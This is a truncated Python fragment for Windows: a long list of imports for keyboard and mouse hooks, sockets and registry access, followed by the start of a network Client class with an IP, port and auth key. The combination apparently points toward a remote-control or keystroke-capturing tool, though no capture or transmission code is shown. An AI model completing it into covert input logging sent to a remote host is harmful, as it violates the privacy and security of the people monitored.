import ctypes
ctypes.windll.user32.MessageBoxA(0, "pyautogui is under 1.350", "python", 1)
alerttime = -1
import sys
import re
import psutil
import os
import pyautogui
import win32gui
import win32process
import win32con
import win32api
import _winreg
import pythoncom
import pyHook
import socket
import zlib
import pickle
import warnings
import time
import keyboard
import pynput.mouse
import pynput.keyboard
import threading

class Client:
    def __init__(self, ip, port, authkey):
        self.ip = ip
        self.port = port
        self.authkey = authkey
        self.m = IllegalCharacters(re.escape('*') + "'")
        self.childpids = []
        self.user32 = ctypes.windll.user32
        self.status = 1
        self.HANDLE = ctypes.windll.kernel32.GetStdHandle(-11)
        self.forecolor = 15
        self.
